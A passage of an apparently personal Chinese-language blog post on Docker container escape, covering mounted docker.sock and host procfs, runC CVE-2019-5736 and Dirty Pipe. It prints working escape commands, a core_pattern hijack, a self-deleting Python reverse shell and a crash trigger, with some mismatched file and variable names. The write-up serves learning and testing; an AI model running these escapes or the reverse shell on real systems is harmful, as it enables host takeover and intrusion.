+<p>通俗一点：在启动<code>docker</code>容器时，将宿主机<code>/var/run/docker.sock</code>文件挂载到<code>docker</code>容器中，在<code>docker</code>容器中，也可以再创建一个 <code>docker</code>，并将跟，目录挂载到新创建的容器内，实现挂载逃逸。</p>
+</blockquote>
+<h5 id="docker-容器复现-3"><a href="#docker-容器复现-3" class="headerlink" title="docker 容器复现"></a>docker 容器复现</h5><ul>
+<li><p>环境搭建</p>
+<ul>
+<li>先搭建docker并挂载：<code>docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash</code></li>
+</ul>
+</li>
+<li><p>漏洞验证</p>
+<ul>
+<li>如果能再 docker 中找到 sock 挂载文件就说明漏洞存在(<code>find / -name *.sock</code> )</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li>在容器中装 <code>docker</code> ：<code>apt-get update;apt-get install docker.io</code></li>
+<li>在<code>docker</code>容器中，使用命令查看宿主机拉取的镜像 <code>docker -H unix://var/run/docker.sock images</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker -H unix://var/run/docker.sock images </span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">ubuntu        latest    3db8720ecbf5   2 weeks ago     77.9MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line"><span class="comment"># 已经看到宿主机的docker</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​	在该 docker 中运行一个 docker 如上面的 ubuntu 然后把宿主机根目录挂载进来。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@33bbc53772f2:/# docker -H unix://var/run/docker.sock run -v /docker-test:/test -it ubuntu /bin/bash</span><br><span class="line">root@5138e163ac71:/#    //可以看到已经换容器了。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​	剩下操作与第一个基于特权的一样，写计划任务</li>
+</ul>
+<h4 id="挂载宿主机-procfs-的情况"><a href="#挂载宿主机-procfs-的情况" class="headerlink" title="挂载宿主机 procfs 的情况"></a><strong>挂载宿主机 procfs 的情况</strong></h4><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。</p>
+<ul>
+<li>文件<code>/proc/sys/kernel/core_pattern</code>它在Linux系统中，如果进程崩溃了，系统内核会捕获到进程崩溃信息，将进程崩溃信息传递给这个文件中的程序或者脚本。</li>
+<li>从 2.6.19 内核版本开始，Linux 支持在 <code>/proc/sys/kernel/core_pattern</code> 中使用新语法。如果该文件中的首个字符是管道符’|’，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</li>
+</ul>
+<h5 id="docker-容器复现-4"><a href="#docker-容器复现-4" class="headerlink" title="docker 容器复现"></a>docker 容器复现</h5><ul>
+<li><p>环境搭建</p>
+<ul>
+<li>创建一个容器并挂载 <code>/proc</code> 目录：<code>docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu</code></li>
+</ul>
+</li>
+<li><p>漏洞验证</p>
+<ul>
+<li><p>如果能再 docker 中找到两个<code>core_pattern</code> 文件：<code>find / -name core_pattern</code></p>
+</li>
+<li><p>执行以下命令返回’mountes’：<code>find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;mounted.&quot; || echo &quot;not mounted.&quot;</code></p>
+</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li>当启动一个容器时，会在<code>/var/lib/docker/overlay2</code>目录下生成一层容器层，容器层里面包括<code>diff、link、lower、merged、work</code>目录，而<code>docker</code>容器的目录保存在<code>merged</code>目录中，通过命令找到当前容器在宿主机下的绝对路径，<code>workdir</code>代表的是<code>docker</code>容器在宿主机中的绝对路径</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">宿主机</span></span><br><span class="line">root@VM-8-4-debian:/var/lib/docker# cd /var/lib/docker/overlay2</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2# ls</span><br><span class="line">760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c</span><br><span class="line">760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c-init</span><br><span class="line">96e2b79bdb96147754d96aa991dc3f350b9b30dbd52e566ac58026d24cebcc5f</span><br><span class="line">aba62047cc5b79a3ab92605b0d3aa8262d2ad6bbaf1d8706561092f4930cd3ba</span><br><span class="line">l</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2# cd 760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2/760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c# ls</span><br><span class="line">diff  link  lower  merged  work</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2/760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c# cd merged;ls</span><br><span class="line">bin   dev  home  lib    lib64   media  opt   root  sbin  sys  usr</span><br><span class="line">boot  etc  host  lib32  libx32  mnt    proc  run   srv   tmp  var</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在容器中查看该绝对路径并定义为 <code>host_dir</code> : <code>host_path=$(sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab)</code></p>
+<ul>
+<li><p>写马：<code>echo -e &quot;|$host_dir/tmp/.t.py \\rcore&quot; &gt; /host/sys/kernel/core_pattern</code></p>
+</li>
+<li><p>接下来在容器里：<code>/tmp/.x.py</code> 中写马</p>
+<p>示例：</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">lport = xxx</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">    pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li><p>最后，在容器内运行一个可以崩溃的程序即可，例如：x.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *a = <span class="literal">NULL</span>;</span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行：<code>gcc t.c -o t &amp;&amp; ./t</code>  （容器需要提前安装 gcc 环境）</p>
+</li>
+</ul>
+<h3 id="基于程序漏洞的逃逸"><a href="#基于程序漏洞的逃逸" class="headerlink" title="基于程序漏洞的逃逸"></a>基于程序漏洞的逃逸</h3><p>相关程序漏洞，指的是那些参与到容器生态中的服务端、客户端程序自身存在的漏洞。有关程序组件，见下图：</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302144614060.png" alt="image-20240302144614060" style="zoom:33%;" />
+
+<h4 id="Docker-runC逃逸-CVE-2019-5736"><a href="#Docker-runC逃逸-CVE-2019-5736" class="headerlink" title="Docker runC逃逸-CVE-2019-5736"></a><strong>Docker runC逃逸-CVE-2019-5736</strong></h4><p>比较详细的解说见：<a target="_blank" rel="noopener" href="https://www.notion.so/83c38257edcd438dba59a141a354beda?pvs=21">容器逃逸成真：从CTF解题到CVE-2019-5736漏洞挖掘分析</a></p>
+<p>总结：</p>
+<ul>
+<li>我们在执行功能类似于 <code>docker exec</code> 的命令时，底层实际上是容器运行时在操作。例如 <code>runc</code></li>
+<li>相应地，<code>runc exec</code>命令会被执行。它的最终效果是在容器内部执行用户指定的程序。进一步讲，就是在容器的各种命名空间内，受到各种限制（如<code>cgroups</code>）的情况下，启动一个进程。除此以外，这个操作与宿主机上执行一个程序并无二致。</li>
+<li>这个过程中存在的风险在于：<code>/proc</code> ：如果尝试打开<code>/proc/[PID]/exe</code> ，在权限检查通过的情况下，内核将直接返回一个指向该文件的描述符（file descriptor），而非按照传统的打开方式去做路径解析和文件查找。这样一来，它实际上绕过了 <code>mnt</code> 命名空间及 <code>chroot</code> 对一个进程能够访问到的文件路径的限制。</li>
+<li>在 <code>runc exec</code> 加入到容器的命名空间之后，容器内进程已经能够通过内部 <code>/proc</code> 观察到它，此时如果打开 <code>/proc/[runc-PID]/exe</code> 并写入一些内容，就能够实现将宿主机上的 <code>runc</code> 二进制程序覆盖掉！这样一来，下一次用户调用 <code>runc</code> 去执行命令时，实际执行的将是攻击者放置的指令。</li>
+</ul>
+<p>在未升级的容器环境上，上述思路是可行的，但是攻击者想要在容器内实现宿主机上的代码执行（逃逸），还需要面对两个限制：</p>
+<ol>
+<li>需要具有容器内部 root 权限；</li>
+<li>Linux 不允许修改正在运行进程对应的本地二进制文件。</li>
+</ol>
+<p>事实上，限制1经常不存在，很多容器服务开放给用户的仍然是root权限；而限制2是可以克服的</p>
+<blockquote>
+<p> <strong>影响版本</strong></p>
+<p>docker version &lt;&#x3D; 18.09.2</p>
+<p>RunC version &lt; 1.0-rc6</p>
+</blockquote>
+<p>因为个人服务器docker版本过高，且EXP成熟，就不复现了。流程：</p>
+<ul>
+<li><p>使用EXP： <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+</li>
+<li><p>编译POC：<code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64  go build main.go</code></p>
+</li>
+<li><p>开启监听后在容器中模拟用户进入docker镜像：<code>docker exec -it container_id bash</code></p>
+</li>
+<li><p>此时会发现runC文件被改变</p>
+</li>
+</ul>
+<h3 id="基于内核漏洞的逃逸"><a href="#基于内核漏洞的逃逸" class="headerlink" title="基于内核漏洞的逃逸"></a>基于内核漏洞的逃逸</h3><h4 id="脏管道-CVE-2022-0847-Dirty-Pipe"><a href="#脏管道-CVE-2022-0847-Dirty-Pipe" class="headerlink" title="脏管道(CVE-2022-0847) Dirty Pipe"></a>脏管道(CVE-2022-0847) Dirty Pipe</h4><p>该漏洞的大概原理为<code>splice</code>系统调用由于未初始化某buf，可能包含旧的<code>PIPE_BUF_FLAG_CAN_MERGE</code>，导致可以通过管道越界写，覆盖关键文件如<code>/etc/passwd</code>可达到提权的效果。因漏洞类型和“DirtyCow”（脏牛）类似，发现者 Max Kellermann 研究员将该漏洞命名为 Dirty Pipe</p>
+<p>参考链接</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://fa1lr4in.com/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析</a></li>
+</ul>
+<p>总结一些前置知识点</p>
+<ul>
+<li>管道与重定向的简单区别在于，重定向将命令与文件连接起来，而管道符将命令与命令连接起来。</li>
+<li><code>pipe_write</code>函数对<code>PIPE_BUF_FLAG_CAN_MERGE</code>的操作，本来无关痛痒，只是可以随意覆写管道。但是由于 <code>page cache</code> 的存在，令我们随意覆写管道转换成随意覆写文件，后面想到可以覆写 <code>/etc/passwd</code> ，最终达到提权的目的</li>
+</ul>
+<p>漏洞复现</p>
+<ul>
+<li>在虚拟机（centos 7， 3.10.0-1160 kernal）中使用 <code>psych</code> 用户进行测试</li>
+<li>使用 github 上 poc，运行后直接提权为 root<ul>
+<li>贴不了图了，centos 7 精简版难用的我想杀人</li>
+</ul>
+</li>
+</ul>
+<p>poc理解</p>
+<ul>
+<li>创建pipe</li>
+<li>使用任意数据填充管道(填满, 而且是填满Pipe的最大空间)</li>
+<li>清空管道内数据</li>
+<li>使用splice()读取目标文件(只读)的1字节数据发送至pipe</li>
+<li>write()将任意数据继续写入pipe, 此数据将会覆盖目标文件内容</li>
+</ul>
+<p>只要挑选合适的目标文件(必须要有可读权限), 利用漏洞Patch掉关键字段数据, 即可完成从普通用户到root用户的权限提升, POC使用的是&#x2F;etc&#x2F;passwd文件的利用方式。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>涉及内核漏洞的提权方式几乎都理解不了，太硬核了，用用 poc 得了。</p>
+<p>其余逃逸很大程度都是通过挂载进行逃逸。要么本容器挂载，要么本容器里再创建一个容器挂载。思路差不多，主要围绕 capabilities 和 mount 利用，总的来说感觉都是属于提权操作吧。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">安全问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">3.</span> <span class="toc-text">容器逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83"><span class="toc-number">3.2.1.</span> <span class="toc-text">检测容器环境</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.2.1.0.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-API-%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.2.</span> <span class="toc-text">基于 API 漏洞的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E8%BF%9C%E7%A8%8BAPI-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%80%83%E9%80%B8"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">Docker 远程API 未授权访问逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.2.2.1.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8D%B1%E9%99%A9%E9%85%8D%E7%BD%AE%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.3.</span> <span class="toc-text">基于危险配置的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#privileged%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E8%BF%90%E8%A1%8C%E5%AE%B9%E5%99%A8"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">privileged特权模式运行容器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">3.2.3.1.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.4.</span> <span class="toc-text">基于危险挂载的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD-Docker-Socket-%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">挂载 Docker Socket 的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">3.2.4.1.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA-procfs-%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">挂载宿主机 procfs 的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E5%AE%B9%E5%99%A8%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">3.2.4.2.1.</span> <span class="toc-text">docker 容器复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.5.</span> <span class="toc-text">基于程序漏洞的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-runC%E9%80%83%E9%80%B8-CVE-2019-5736"><span class="toc-number">3.2.5.1.</span> <span class="toc-text">Docker runC逃逸-CVE-2019-5736</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%83%E9%80%B8"><span class="toc-number">3.2.6.</span> <span class="toc-text">基于内核漏洞的逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%8F%E7%AE%A1%E9%81%93-CVE-2022-0847-Dirty-Pipe"><span class="toc-number">3.2.6.1.</span> <span class="toc-text">脏管道(CVE-2022-0847) Dirty Pipe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&text=Docker容器逃逸"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&is_video=false&description=Docker容器逃逸"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Docker容器逃逸&body=Check out this article: http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&title=Docker容器逃逸"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&name=Docker容器逃逸&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/&t=Docker容器逃逸"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
